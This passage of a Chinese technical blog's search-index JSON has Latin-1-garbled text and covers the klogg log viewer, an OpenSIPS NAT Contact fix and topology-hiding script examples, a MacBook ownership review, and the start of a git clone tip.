è½½æ—¥å¿—æ–‡ä»¶\nå°†æ—¥å¿—æ–‡ä»¶æ‹–åŠ¨åˆ°kloggä¸­ ç›´æ¥å°†å¸¸è§çš„å‹ç¼©åŒ…æ–‡ä»¶æ‹–åŠ¨åˆ°kloggä¸­ï¼Œkloggerå°†ä¼šè‡ªåŠ¨å°†å…¶è§£å‹åå±•ç¤º æ”¯æŒä»http urlåœ°å€ä¸‹è½½æ—¥å¿—ï¼Œç„¶åæŸ¥çœ‹ æ”¯æŒä»å‰ªè´´æ¿å¤åˆ¶æ—¥å¿—ï¼Œç„¶åå±•ç¤º 4. è¿‡æ»¤è¡¨è¾¾å¼ å› ä¸ºkloggæ”¯æŒæ­£åˆ™è¿‡æ»¤ï¼Œæ‰€ä»¥ä»–çš„åŠŸèƒ½å°±éå¸¸å¼ºæ‚äº†ã€‚\né€»è¾‘è¡¨è¾¾å¼\nè¡¨è¾¾å¼ ä¾‹å­ å¤‡æ³¨ ä¸ and \u0026ldquo;open\u0026rdquo; and \u0026ldquo;close\u0026rdquo; åŒ…å«openï¼Œå¹¶ä¸”åŒ…å«close æˆ– or \u0026ldquo;open\u0026rdquo; or \u0026ldquo;close\u0026rdquo; åŒ…å«open, æˆ–è€… close é not not(\u0026ldquo;open\u0026rdquo;) ä¸åŒ…å«open ä¸æˆ–éåŒæ—¶æ”¯æŒå¤æ‚çš„è¿ç®—ï¼Œä¾‹å¦‚åŒ…å«open ä½†æ˜¯ä¸åŒ…å«close: \u0026quot;open\u0026quot; and not(\u0026quot;close\u0026quot;)\n5. å¿«æ·æ–¹å¼ kloggçš„å¿«æ·æ–¹å¼å¾ˆå¤šå‚è€ƒäº†vim, vimä½¿ç”¨è€…éå¸¸é«˜å…´ã€‚\né”® åŠ¨ä½œ arrows ä¸Šä¸‹æˆ–è€…å·¦å³ç§»åŠ¨ [number] j/k æ”¯æŒç”¨j/kä¸Šä¸‹ç§»åŠ¨ h/l æ”¯æŒç”¨h/lå·¦å³ç§»åŠ¨ ^ or $ æ»šåŠ¨åˆ°æŸè¡Œçš„å¼€å§‹æˆ–è€…ç»“å°¾ [number] g è·³åˆ°å¯¹åº”çš„è¡Œ entered G è·³åˆ°ç¬¬ä¸€è¡Œ Shift+G è·³åˆ°æœ€åä¸€è¡Œ Alt+G æ˜¾ç¤ºè·³åˆ°æŸä¸€è¡Œçš„å¯¹è¯æ¡† \u0026rsquo; or \u0026quot; åœ¨å½“å‰å±å¹•å¿«é€Ÿæœç´¢ (forward and backward) n or N å‘å‰æˆ–è€…å‘åè·³ * or . search for the next occurrence of the currently selected text / or , search for the previous occurrence of the currently selected text f æµçš„æ–¹å¼ï¼Œç±»ä¼¼ tail -f m æ ‡è®°æŸä¸€è¡Œï¼Œæ ‡è®°åçš„è¡Œä¼šè‡ªåŠ¨åŠ å…¥è¿‡æ»¤ç»“æœä¸­ [ or ] è·³è½¬åˆ°ä¸Šä¸€ä¸ªæˆ–è€…ä¸‹ä¸€æ ‡è®°ç‚¹ + or - è°ƒæ•´è¿‡æ»¤çª—å£çš„å°ºå¯¸ v å¾ªç¯åˆ‡æ¢å„ç§æ˜¾ç¤ºæ¨¡å¼- Matches: åªæ˜¾å¼åŒ¹é…çš„å†…å®¹- Marks: åªæ˜¾å¼æ ‡è®°çš„å†…å®¹- Marks and Matchsï¼šæ˜¾ç¤ºåŒ¹é…å’Œæ ‡è®°çš„å†…å®¹ (Marks and Matches -\u0026gt; Marks -\u0026gt; Matches) F5 é‡æ–°åŠ è½½æ–‡ä»¶ Ctrl+S Set focus to search string edit box Ctrl+Shift+O æ‰“å¼€å¯¹è¯æ¡†å»é€‰æ‹©å…¶ä»–æ–‡ä»¶ å‚è€ƒ https://github.com/variar/klogg/blob/master/DOCUMENTATION.md ","permalink":"https://wdd.js.org/posts/2022/04/cipwms/","summary":"é¡¹ç›®ä¿¡æ¯ githubåœ°å€ https://github.com/variar/klogg\n1. å®‰è£… kloggæ˜¯ä¸ªè·¨å¹³å°è½¯ä»¶ï¼Œwindows, mac, linuxéƒ½å¯ä»¥å®‰è£…ã€‚å…·ä½“å®‰è£…æ–¹å¼å‚è€ƒgithubé¡¹ç›®åœ°å€\n2. ç•Œé¢å¸ƒå±€ æ–‡ä»¶ä¿¡æ¯æ  æ—¥å¿—æ  è¿‡æ»¤å™¨è®¾ç½®æ  è¿‡æ»¤åçš„æ—¥å¿—æ˜¾ç¤ºæ  3. æ–‡ä»¶åŠ è½½ kloggæ”¯æŒå¤šç§æ–¹å¼åŠ è½½æ—¥å¿—æ–‡ä»¶\nå°†æ—¥å¿—æ–‡ä»¶æ‹–åŠ¨åˆ°kloggä¸­ ç›´æ¥å°†å¸¸è§çš„å‹ç¼©åŒ…æ–‡ä»¶æ‹–åŠ¨åˆ°kloggä¸­ï¼Œkloggerå°†ä¼šè‡ªåŠ¨å°†å…¶è§£å‹åå±•ç¤º æ”¯æŒä»http urlåœ°å€ä¸‹è½½æ—¥å¿—ï¼Œç„¶åæŸ¥çœ‹ æ”¯æŒä»å‰ªè´´æ¿å¤åˆ¶æ—¥å¿—ï¼Œç„¶åå±•ç¤º 4. è¿‡æ»¤è¡¨è¾¾å¼ å› ä¸ºkloggæ”¯æŒæ­£åˆ™è¿‡æ»¤ï¼Œæ‰€ä»¥ä»–çš„åŠŸèƒ½å°±éå¸¸å¼ºæ‚äº†ã€‚\né€»è¾‘è¡¨è¾¾å¼\nè¡¨è¾¾å¼ ä¾‹å­ å¤‡æ³¨ ä¸ and \u0026ldquo;open\u0026rdquo; and \u0026ldquo;close\u0026rdquo; åŒ…å«openï¼Œå¹¶ä¸”åŒ…å«close æˆ– or \u0026ldquo;open\u0026rdquo; or \u0026ldquo;close\u0026rdquo; åŒ…å«open, æˆ–è€… close é not not(\u0026ldquo;open\u0026rdquo;) ä¸åŒ…å«open ä¸æˆ–éåŒæ—¶æ”¯æŒå¤æ‚çš„è¿ç®—ï¼Œä¾‹å¦‚åŒ…å«open ä½†æ˜¯ä¸åŒ…å«close: \u0026quot;open\u0026quot; and not(\u0026quot;close\u0026quot;)\n5. å¿«æ·æ–¹å¼ kloggçš„å¿«æ·æ–¹å¼å¾ˆå¤šå‚è€ƒäº†vim, vimä½¿ç”¨è€…éå¸¸é«˜å…´ã€‚\né”® åŠ¨ä½œ arrows ä¸Šä¸‹æˆ–è€…å·¦å³ç§»åŠ¨ [number] j/k æ”¯æŒç”¨j/kä¸Šä¸‹ç§»åŠ¨ h/l æ”¯æŒç”¨h/lå·¦å³ç§»åŠ¨ ^ or $ æ»šåŠ¨åˆ°æŸè¡Œçš„å¼€å§‹æˆ–è€…ç»“å°¾ [number] g è·³åˆ°å¯¹åº”çš„è¡Œ entered G è·³åˆ°ç¬¬ä¸€è¡Œ Shift+G è·³åˆ°æœ€åä¸€è¡Œ Alt+G æ˜¾ç¤ºè·³åˆ°æŸä¸€è¡Œçš„å¯¹è¯æ¡† \u0026rsquo; or \u0026quot; åœ¨å½“å‰å±å¹•å¿«é€Ÿæœç´¢ (forward and backward) n or N å‘å‰æˆ–è€…å‘åè·³ * or .","title":"klogg: ç›®å‰æˆ‘æœ€å–œæ¬¢çš„æ—¥å¿—æŸ¥çœ‹å·¥å…·"},{"content":"è¿™ä¸ªæŠ¥é”™æ¯”è¾ƒå®¹æ˜“å‡ºç°åœ¨tcpè½¬udpçš„åœºæ™¯ï¼Œå¯ä»¥çœ‹ä»¥ä¸‹çš„æ—¶åºå›¾\nabä¹‹é—´ç”¨tcpé€šä¿¡ï¼Œbcä¹‹é—´ç”¨udpé€šä¿¡ã€‚åœ¨é€šè¯å»ºç«‹åï¼Œcç»™bå‘é€äº†byeè¯·æ±‚ï¼Œä½†æ˜¯bå‘é€ç»™äº†c 477ã€‚æ­£å¸¸æ¥è¯´båº”è¯¥æŠŠbyeè½¬å‘ç»™a.\né‚£ä¹ˆé—®é¢˜å‡ºåœ¨å“ªé‡Œå‘¢ï¼Ÿ\né—®é¢˜å°±å‡ºåœ¨updateè¯·æ±‚çš„å“åº”ä¸Šï¼Œupdateçš„å“åº”200okä¸­å¸¦æœ‰Contactå¤´ï¼Œå¦‚æœæ˜¯Contactæ˜¯ä¸ªnatçš„åœ°å€ï¼Œæ²¡æœ‰ç»è¿‡fixed nat, é‚£ä¹ˆbæ˜¯æ— æ³•ç›´æ¥ç»™natå†…éƒ¨çš„åœ°å€å‘é€è¯·æ±‚çš„ã€‚\nå¤„ç†çš„åŠæ³•ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯åœ¨æ”¶åˆ°aè¿”å›çš„200okæ—¶ï¼Œæ‰§è¡Œfix_nated_contact()\né‡åˆ°è¿™ç§é—®é¢˜ï¼Œå¾€å¾€è¿›å…¥ä¸€ç§æ€ç»´è¯¯åŒºï¼Œå°±æ˜¯åœ¨INVITEè¯·æ±‚æˆåŠŸåï¼Œfixäº†nat Contactåï¼ŒContactå¤´æ˜¯ä¸ä¼šå˜çš„ã€‚\nä½†æ˜¯å®é™…ä¸Šï¼Œå¾ˆå¤šSIPè¯·æ±‚ï¼Œä¾‹å¦‚NOTIFY, UPDATEéƒ½ä¼šæºå¸¦è¯·æ±‚å’Œå“åº”éƒ½ä¼šæºå¸¦Contact, å¦‚æœåªå¤„ç†äº†INVITEçš„Contactå¤´ï¼Œæ²¡æœ‰å¤„ç†å…¶ä»–æºå¸¦Contactçš„sipè¯·æ±‚æˆ–è€…å“åº”ï¼Œå°±å¿…ç„¶ä¹Ÿä¼šé‡åˆ°ç±»ä¼¼çš„é—®é¢˜ã€‚\næˆ‘ä»¬çŸ¥é“SIPçš„Contactåï¼Œå†³å®šäº†åºåˆ—åŒ–è¯·æ±‚çš„request urlã€‚å¦‚æœContactå¤„ç†çš„æœ‰é—®é¢˜ï¼Œå¿…ç„¶åœ¨æŒ‰ç…§request urlè½¬å‘çš„æ—¶å€™å‡ºç°é—®é¢˜ã€‚\nç»¼ä¸Šæ‰€è¿°ï¼šæ— è®ºè¯·æ±‚è¿˜æ˜¯å“åº”ï¼Œéƒ½è¦è€ƒè™‘è¿™ä¸ªæ¶ˆæ¯æ˜¯å¦æºå¸¦äº†Contactå¤´ï¼Œä»¥åŠæ˜¯å¦éœ€è¦fix nat Contactã€‚\n","permalink":"https://wdd.js.org/opensips/ch7/tm-send-failed/","summary":"è¿™ä¸ªæŠ¥é”™æ¯”è¾ƒå®¹æ˜“å‡ºç°åœ¨tcpè½¬udpçš„åœºæ™¯ï¼Œå¯ä»¥çœ‹ä»¥ä¸‹çš„æ—¶åºå›¾\nabä¹‹é—´ç”¨tcpé€šä¿¡ï¼Œbcä¹‹é—´ç”¨udpé€šä¿¡ã€‚åœ¨é€šè¯å»ºç«‹åï¼Œcç»™bå‘é€äº†byeè¯·æ±‚ï¼Œä½†æ˜¯bå‘é€ç»™äº†c 477ã€‚æ­£å¸¸æ¥è¯´båº”è¯¥æŠŠbyeè½¬å‘ç»™a.\né‚£ä¹ˆé—®é¢˜å‡ºåœ¨å“ªé‡Œå‘¢ï¼Ÿ\né—®é¢˜å°±å‡ºåœ¨updateè¯·æ±‚çš„å“åº”ä¸Šï¼Œupdateçš„å“åº”200okä¸­å¸¦æœ‰Contactå¤´ï¼Œå¦‚æœæ˜¯Contactæ˜¯ä¸ªnatçš„åœ°å€ï¼Œæ²¡æœ‰ç»è¿‡fixed nat, é‚£ä¹ˆbæ˜¯æ— æ³•ç›´æ¥ç»™natå†…éƒ¨çš„åœ°å€å‘é€è¯·æ±‚çš„ã€‚\nå¤„ç†çš„åŠæ³•ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯åœ¨æ”¶åˆ°aè¿”å›çš„200okæ—¶ï¼Œæ‰§è¡Œfix_nated_contact()\né‡åˆ°è¿™ç§é—®é¢˜ï¼Œå¾€å¾€è¿›å…¥ä¸€ç§æ€ç»´è¯¯åŒºï¼Œå°±æ˜¯åœ¨INVITEè¯·æ±‚æˆåŠŸåï¼Œfixäº†nat Contactåï¼ŒContactå¤´æ˜¯ä¸ä¼šå˜çš„ã€‚\nä½†æ˜¯å®é™…ä¸Šï¼Œå¾ˆå¤šSIPè¯·æ±‚ï¼Œä¾‹å¦‚NOTIFY, UPDATEéƒ½ä¼šæºå¸¦è¯·æ±‚å’Œå“åº”éƒ½ä¼šæºå¸¦Contact, å¦‚æœåªå¤„ç†äº†INVITEçš„Contactå¤´ï¼Œæ²¡æœ‰å¤„ç†å…¶ä»–æºå¸¦Contactçš„sipè¯·æ±‚æˆ–è€…å“åº”ï¼Œå°±å¿…ç„¶ä¹Ÿä¼šé‡åˆ°ç±»ä¼¼çš„é—®é¢˜ã€‚\næˆ‘ä»¬çŸ¥é“SIPçš„Contactåï¼Œå†³å®šäº†åºåˆ—åŒ–è¯·æ±‚çš„request urlã€‚å¦‚æœContactå¤„ç†çš„æœ‰é—®é¢˜ï¼Œå¿…ç„¶åœ¨æŒ‰ç…§request urlè½¬å‘çš„æ—¶å€™å‡ºç°é—®é¢˜ã€‚\nç»¼ä¸Šæ‰€è¿°ï¼šæ— è®ºè¯·æ±‚è¿˜æ˜¯å“åº”ï¼Œéƒ½è¦è€ƒè™‘è¿™ä¸ªæ¶ˆæ¯æ˜¯å¦æºå¸¦äº†Contactå¤´ï¼Œä»¥åŠæ˜¯å¦éœ€è¦fix nat Contactã€‚","title":"opensips 477 Send failed (477/TM)"},{"content":"æˆ‘ä¹‹å‰å†™è¿‡ä¸€ç¯‡æ–‡ç« ã€Šmacbook proä½¿ç”¨ä¸‰å¹´åçš„æ„Ÿå—ã€‹ï¼Œä»Šå¤©è¿™ç¯‡æ–‡ç« æ˜¯ç”¨4.5å¹´çš„æ„Ÿå—ã€‚\nå†æ¬¡æ¢³ç†ä¸€ä¸‹ï¼Œä¸­é—´é‡åˆ°è¿‡çš„é—®é¢˜\nè´è¶é”®ç›˜å¾ˆæ—©æœ‰æœ‰äº›é—®é¢˜äº†ï¼Œæœ€è¿‘ç–«æƒ…åœ¨å®¶ï¼Œé”®ç›˜è¢«ç”¨åäº†ï¼ŒJé”®ç›´æ¥åäº†ã€‚åªèƒ½å¤–æ¥é”®ç›˜æ¥ç”¨ å±å¹•ä¸‹æ–¹å‡ºç°æ·¡çº¢è‰²çš„çº¹è·¯ï¼Œä¸å¤ªæ˜æ˜¾ï¼ŒåŸºæœ¬ä¸å½±å“ä½¿ç”¨ ä¸­é—´æˆ‘è‡ªå·±ç»™macbookæ¢è¿‡ä¸€æ¬¡ç”µæ± ï¼Œæ¢ç”µæ± ä¹‹å‰åªè¦ä¸æ’ç”µï¼Œmacbookå¾ˆå®¹æ˜“å°±å…³æœºäº† é£æ‰‡ç»å¸¸è½¬ï¼Œå™ªéŸ³æœ‰ç‚¹åµï¼Œæˆ‘å·²ç»è§‰å¾—æ— æ‰€è°“äº† 17å¹´ä¹°è¿™å°ç”µè„‘çš„æ—¶å€™ï¼Œåº”è¯¥æ˜¯9400å·¦å³ã€‚é…ç½®åº”è¯¥æ˜¯æœ€ä½é…çš„ i5åŒæ ¸2.3Ghz, 8Gå†…å­˜ï¼Œ128ç¡¬ç›˜çš„ã€‚\næœ‰äº›äººå¯èƒ½æƒŠè®¶ï¼Œ128Gçš„ç¡¬ç›˜æ€ä¹ˆèƒ½å¤Ÿç”¨çš„ã€‚ä½†æ˜¯æˆ‘çš„ç¡®å¤Ÿç”¨ï¼Œæˆ‘çš„ç£ç›˜è¿˜æœ‰å°†è¿‘50Gçš„å‰©ä½™ç©ºé—´å‘¢ã€‚\næˆ‘ä¸æ˜¯è§†é¢‘æˆ–è€…å½±éŸ³å·¥ä½œè€…ï¼Œç”¨çš„è½¯ä»¶æ¯”è¾ƒå°‘ã€‚æ•´ä¸ªåº”ç”¨ç¨‹åºæ‰€å ç”¨çš„ç©ºé—´æ‰4ä¸ªå¤šGã€‚å‰©ä¸‹çš„æ–‡ç¨¿å¯èƒ½å¤§éƒ¨åˆ†æ˜¯ä»£ç ã€‚\nç”±äºæˆ‘æˆ‘åŸºæœ¬ä¸Šéƒ½æ˜¯è¿œç¨‹ç”¨sshè¿ä¸Šnucä¸Šå¼€å‘ï¼Œæ‰€ä»¥macä¸Šçš„èµ„æ–™æ›´å°‘ã€‚\nä½†æ˜¯macbooké”®ç›˜åäº†è¿™ä¸ªé—®é¢˜ï¼Œæ˜¯ä¸èƒ½å¿çš„ã€‚å¶å°”è¦ç§»åŠ¨åŠå·¥çš„æ—¶å€™ï¼Œä¸å¯èƒ½å†å¸¦ä¸ªå¤–æ¥é”®ç›˜å§ã€‚\næ˜¯æ—¶å€™å‡†å¤‡å’Œé™ªä¼´æˆ‘4.5å¹´çš„ç”µè„‘è¯´å†è§äº†ã€‚\næœ¬æ¥æƒ³ä¹°14å¯¸çš„macbook pro m1çš„ï¼Œä½†æ˜¯é‡é‡çš„å¢åŠ ä»¥åŠå¾ˆä¸‘çš„åˆ˜æµ·ä¹Ÿæ˜¯æˆ‘ä¸èƒ½å¿çš„ã€‚\næ‰€ä»¥æˆ‘è§‰å¾—æˆ‘ä¼šä¹°ä¸€å°è½»ä¾¿ç‚¹çš„windowsç¬”è®°æœ¬ï¼Œè€Œä¸”windowsè¿˜æœ‰ä¸€ä¸ªå¾ˆå¸å¼•æˆ‘çš„ç‚¹ï¼Œå°±æ˜¯linuxå­ç³»ç»Ÿã€‚è¿™ä¸ªlinuxå­ç³»ç»Ÿï¼Œè¦æ¯”macçš„ç³»ç»Ÿæ›´åŠ linuxã€‚\nå„ä½åŒå­¦æœ‰æ²¡æœ‰æ¨èçš„windowsçš„è½»ä¾¿ç¬”è®°æœ¬å‘¢ï¼Ÿ\n","permalink":"https://wdd.js.org/posts/2022/04/er3vob/","summary":"æˆ‘ä¹‹å‰å†™è¿‡ä¸€ç¯‡æ–‡ç« ã€Šmacbook proä½¿ç”¨ä¸‰å¹´åçš„æ„Ÿå—ã€‹ï¼Œä»Šå¤©è¿™ç¯‡æ–‡ç« æ˜¯ç”¨4.5å¹´çš„æ„Ÿå—ã€‚\nå†æ¬¡æ¢³ç†ä¸€ä¸‹ï¼Œä¸­é—´é‡åˆ°è¿‡çš„é—®é¢˜\nè´è¶é”®ç›˜å¾ˆæ—©æœ‰æœ‰äº›é—®é¢˜äº†ï¼Œæœ€è¿‘ç–«æƒ…åœ¨å®¶ï¼Œé”®ç›˜è¢«ç”¨åäº†ï¼ŒJé”®ç›´æ¥åäº†ã€‚åªèƒ½å¤–æ¥é”®ç›˜æ¥ç”¨ å±å¹•ä¸‹æ–¹å‡ºç°æ·¡çº¢è‰²çš„çº¹è·¯ï¼Œä¸å¤ªæ˜æ˜¾ï¼ŒåŸºæœ¬ä¸å½±å“ä½¿ç”¨ ä¸­é—´æˆ‘è‡ªå·±ç»™macbookæ¢è¿‡ä¸€æ¬¡ç”µæ± ï¼Œæ¢ç”µæ± ä¹‹å‰åªè¦ä¸æ’ç”µï¼Œmacbookå¾ˆå®¹æ˜“å°±å…³æœºäº† é£æ‰‡ç»å¸¸è½¬ï¼Œå™ªéŸ³æœ‰ç‚¹åµï¼Œæˆ‘å·²ç»è§‰å¾—æ— æ‰€è°“äº† 17å¹´ä¹°è¿™å°ç”µè„‘çš„æ—¶å€™ï¼Œåº”è¯¥æ˜¯9400å·¦å³ã€‚é…ç½®åº”è¯¥æ˜¯æœ€ä½é…çš„ i5åŒæ ¸2.3Ghz, 8Gå†…å­˜ï¼Œ128ç¡¬ç›˜çš„ã€‚\næœ‰äº›äººå¯èƒ½æƒŠè®¶ï¼Œ128Gçš„ç¡¬ç›˜æ€ä¹ˆèƒ½å¤Ÿç”¨çš„ã€‚ä½†æ˜¯æˆ‘çš„ç¡®å¤Ÿç”¨ï¼Œæˆ‘çš„ç£ç›˜è¿˜æœ‰å°†è¿‘50Gçš„å‰©ä½™ç©ºé—´å‘¢ã€‚\næˆ‘ä¸æ˜¯è§†é¢‘æˆ–è€…å½±éŸ³å·¥ä½œè€…ï¼Œç”¨çš„è½¯ä»¶æ¯”è¾ƒå°‘ã€‚æ•´ä¸ªåº”ç”¨ç¨‹åºæ‰€å ç”¨çš„ç©ºé—´æ‰4ä¸ªå¤šGã€‚å‰©ä¸‹çš„æ–‡ç¨¿å¯èƒ½å¤§éƒ¨åˆ†æ˜¯ä»£ç ã€‚\nç”±äºæˆ‘æˆ‘åŸºæœ¬ä¸Šéƒ½æ˜¯è¿œç¨‹ç”¨sshè¿ä¸Šnucä¸Šå¼€å‘ï¼Œæ‰€ä»¥macä¸Šçš„èµ„æ–™æ›´å°‘ã€‚\nä½†æ˜¯macbooké”®ç›˜åäº†è¿™ä¸ªé—®é¢˜ï¼Œæ˜¯ä¸èƒ½å¿çš„ã€‚å¶å°”è¦ç§»åŠ¨åŠå·¥çš„æ—¶å€™ï¼Œä¸å¯èƒ½å†å¸¦ä¸ªå¤–æ¥é”®ç›˜å§ã€‚\næ˜¯æ—¶å€™å‡†å¤‡å’Œé™ªä¼´æˆ‘4.5å¹´çš„ç”µè„‘è¯´å†è§äº†ã€‚\næœ¬æ¥æƒ³ä¹°14å¯¸çš„macbook pro m1çš„ï¼Œä½†æ˜¯é‡é‡çš„å¢åŠ ä»¥åŠå¾ˆä¸‘çš„åˆ˜æµ·ä¹Ÿæ˜¯æˆ‘ä¸èƒ½å¿çš„ã€‚\næ‰€ä»¥æˆ‘è§‰å¾—æˆ‘ä¼šä¹°ä¸€å°è½»ä¾¿ç‚¹çš„windowsç¬”è®°æœ¬ï¼Œè€Œä¸”windowsè¿˜æœ‰ä¸€ä¸ªå¾ˆå¸å¼•æˆ‘çš„ç‚¹ï¼Œå°±æ˜¯linuxå­ç³»ç»Ÿã€‚è¿™ä¸ªlinuxå­ç³»ç»Ÿï¼Œè¦æ¯”macçš„ç³»ç»Ÿæ›´åŠ linuxã€‚\nå„ä½åŒå­¦æœ‰æ²¡æœ‰æ¨èçš„windowsçš„è½»ä¾¿ç¬”è®°æœ¬å‘¢ï¼Ÿ","title":"macbook pro ä½¿ç”¨1664å¤©çš„æ„Ÿå—"},{"content":"1. æ‹“æ‰‘éšè—åŠŸèƒ½ åˆ é™¤Viaå¤´ åˆ é™¤Route åˆ é™¤Record-Route ä¿®æ”¹Contact å¯é€‰éšè—Call-ID å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæ ¹æ®SIPçš„Via, Route, Record-Routeçš„å¤´ï¼Œå¾€å¾€å¯ä»¥æ¨æµ‹æœåŠ¡å†…éƒ¨çš„ç½‘ç»œç»“æ„ã€‚\næˆ‘ä»¬ä¸å¸Œæœ›åˆ«äººçŸ¥é“çš„æˆ‘ä»¬çš„å†…éƒ¨ç½‘ç»œç»“æ„ã€‚æˆ‘ä»¬åªå¸Œæœ›åªèƒ½çœ‹åˆ°Cè¿™ä¸ªsip serverã€‚ç»è¿‡æ‹“æ‰‘éšè—è¿‡å\nç”¨æˆ·çœ‹ä¸åˆ°å…³äºaã€bçš„via, route, record-routeå¤´ ç”¨æˆ·çœ‹åˆ°çš„Contactå¤´è¢«ä¿®æ”¹æˆCçš„IPåœ°å€ å¯ä»¥é€‰æ‹©æŠŠåŸå§‹çš„Call-IDä¹Ÿä¿®æ”¹ å½“ç„¶ï¼Œæ‹“æ‰‘éšè—é™¤äº†å¯ä»¥éšè—ä¸€äº›ä¿¡æ¯ï¼Œä¹Ÿæœ‰ä¸€ä¸ªå…¶ä»–çš„å¥½å¤„ï¼šå‡å°‘SIPæ¶ˆæ¯åŒ…çš„é•¿åº¦ã€‚å¦‚æœSIPæ¶ˆæ¯ç”¨UDPä¼ è¾“ï¼Œå‡å°‘åŒ…çš„ä½“ç§¯ï¼Œå¯ä»¥å¤§å¤§é™ä½UDPåˆ†ç‰‡çš„å¯èƒ½æ€§ã€‚\næ‰€ä»¥ï¼Œç»¼ä¸Šæ‰€è¿°ï¼šæ‹“æ‰‘éšè—æœ‰ä»¥ä¸‹å¥½å¤„\néšè—æœåŠ¡å†…éƒ¨ç½‘ç»œç»“æ„ å‡å°‘SIPåŒ…çš„ä½“ç§¯ 2. è„šæœ¬ä¾‹å­ æ‹“æ‰‘éšè—çš„å®ç°å¹¶ä¸å¤æ‚ã€‚é¦–å…ˆè¦åŠ è½½æ‹“æ‰‘éšè—çš„æ¨¡å—\nloadmodule \u0026#34;topology_hiding.so\u0026#34; 2.1 åˆå§‹åŒ–è·¯ç”±çš„å¤„ç† åœ¨åˆå§‹åŒ–è·¯ç”±é‡Œï¼Œåªéœ€è¦è°ƒç”¨topology_hiding()\nU è¡¨ç¤ºä¸éšè—Contactçš„ç”¨æˆ·åä¿¡æ¯ C è¡¨ç¤ºéšè—Call-ID # if it\u0026#39;s an INVITE dialog, we can create the dialog now, will lead to cleaner SIP messages if (is_method(\u0026#34;INVITE\u0026#34;)) create_dialog(); # we do topology hiding, preserving the Contact Username and also hiding the Call-ID topology_hiding(\u0026#34;UC\u0026#34;); t_relay(); exit; 2.2 åºåˆ—åŒ–è·¯ç”±çš„å¤„ç† åœ¨åºåˆ—åŒ–è¯·æ±‚ä¸­ï¼Œåªéœ€è¦è°ƒç”¨topology_hiding_match(), åç»­çš„å°±å¯ä»¥äº¤ç»™OpenSIPSå¤„ç†äº†ã€‚\nif (has_totag()) { if (topology_hiding_match()) { xlog(\u0026#34;Succesfully matched this request to a topology hiding dialog. \\n\u0026#34;); xlog(\u0026#34;Calller side callid is $ci \\n\u0026#34;); xlog(\u0026#34;Callee side callid is $TH_callee_callid \\n\u0026#34;); t_relay(); exit; } else { if ( is_method(\u0026#34;ACK\u0026#34;) ) { if ( t_check_trans() ) { t_relay(); exit; } else exit; } sl_send_reply(\u0026#34;404\u0026#34;,\u0026#34;Not here\u0026#34;); exit; } } 2.3 æ³¨æ„äº‹é¡¹ å¦‚æœç”¨äº†æ‹“æ‰‘éšè—ï¼Œå°±ä¸è¦ç”¨record_route()ç”¨record_route_preset()ï¼Œ å»è®¾ç½®Record-Routeå¤´äº†ï¼Œå¦åˆ™SIPæ¶ˆæ¯å°†ä¼šåœ¨sip serverä¸Šä¸€åªå¾ªç¯å‘é€ã€‚\n4. å‚è€ƒæ–‡æ¡£ https://www.opensips.org/Documentation/Tutorials-Topology-Hiding https://opensips.org/html/docs/modules/2.1.x/topology_hiding.html#idp256096 ","permalink":"https://wdd.js.org/opensips/ch8/topology-hiding/","summary":"1. æ‹“æ‰‘éšè—åŠŸèƒ½ åˆ é™¤Viaå¤´ åˆ é™¤Route åˆ é™¤Record-Route ä¿®æ”¹Contact å¯é€‰éšè—Call-ID å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæ ¹æ®SIPçš„Via, Route, Record-Routeçš„å¤´ï¼Œå¾€å¾€å¯ä»¥æ¨æµ‹æœåŠ¡å†…éƒ¨çš„ç½‘ç»œç»“æ„ã€‚\næˆ‘ä»¬ä¸å¸Œæœ›åˆ«äººçŸ¥é“çš„æˆ‘ä»¬çš„å†…éƒ¨ç½‘ç»œç»“æ„ã€‚æˆ‘ä»¬åªå¸Œæœ›åªèƒ½çœ‹åˆ°Cè¿™ä¸ªsip serverã€‚ç»è¿‡æ‹“æ‰‘éšè—è¿‡å\nç”¨æˆ·çœ‹ä¸åˆ°å…³äºaã€bçš„via, route, record-routeå¤´ ç”¨æˆ·çœ‹åˆ°çš„Contactå¤´è¢«ä¿®æ”¹æˆCçš„IPåœ°å€ å¯ä»¥é€‰æ‹©æŠŠåŸå§‹çš„Call-IDä¹Ÿä¿®æ”¹ å½“ç„¶ï¼Œæ‹“æ‰‘éšè—é™¤äº†å¯ä»¥éšè—ä¸€äº›ä¿¡æ¯ï¼Œä¹Ÿæœ‰ä¸€ä¸ªå…¶ä»–çš„å¥½å¤„ï¼šå‡å°‘SIPæ¶ˆæ¯åŒ…çš„é•¿åº¦ã€‚å¦‚æœSIPæ¶ˆæ¯ç”¨UDPä¼ è¾“ï¼Œå‡å°‘åŒ…çš„ä½“ç§¯ï¼Œå¯ä»¥å¤§å¤§é™ä½UDPåˆ†ç‰‡çš„å¯èƒ½æ€§ã€‚\næ‰€ä»¥ï¼Œç»¼ä¸Šæ‰€è¿°ï¼šæ‹“æ‰‘éšè—æœ‰ä»¥ä¸‹å¥½å¤„\néšè—æœåŠ¡å†…éƒ¨ç½‘ç»œç»“æ„ å‡å°‘SIPåŒ…çš„ä½“ç§¯ 2. è„šæœ¬ä¾‹å­ æ‹“æ‰‘éšè—çš„å®ç°å¹¶ä¸å¤æ‚ã€‚é¦–å…ˆè¦åŠ è½½æ‹“æ‰‘éšè—çš„æ¨¡å—\nloadmodule \u0026#34;topology_hiding.so\u0026#34; 2.1 åˆå§‹åŒ–è·¯ç”±çš„å¤„ç† åœ¨åˆå§‹åŒ–è·¯ç”±é‡Œï¼Œåªéœ€è¦è°ƒç”¨topology_hiding()\nU è¡¨ç¤ºä¸éšè—Contactçš„ç”¨æˆ·åä¿¡æ¯ C è¡¨ç¤ºéšè—Call-ID # if it\u0026#39;s an INVITE dialog, we can create the dialog now, will lead to cleaner SIP messages if (is_method(\u0026#34;INVITE\u0026#34;)) create_dialog(); # we do topology hiding, preserving the Contact Username and also hiding the Call-ID topology_hiding(\u0026#34;UC\u0026#34;); t_relay(); exit; 2.","title":"æ‹“æ‰‘éšè—å­¦ä¹ ä»¥åŠå®è·µ"},{"content":"æˆ‘æœ‰ä¸€ä¸ªgithubä»“åº“ï¼Œhttps://github.com/wangduanduan/opensipsï¼Œ è¿™ä¸ªæºç æ¯”è¾ƒå¤§ï¼Œgit clone æ¯”è¾ƒæ…¢ã€‚\næˆ‘ä»¬ä½¿ç”¨https://www.gitclone.com/æä¾›çš„åŠ é€ŸæœåŠ¡ã€‚\n# ä»githubä¸Šclone git clone https://github.com/wangduanduan/opensips.git 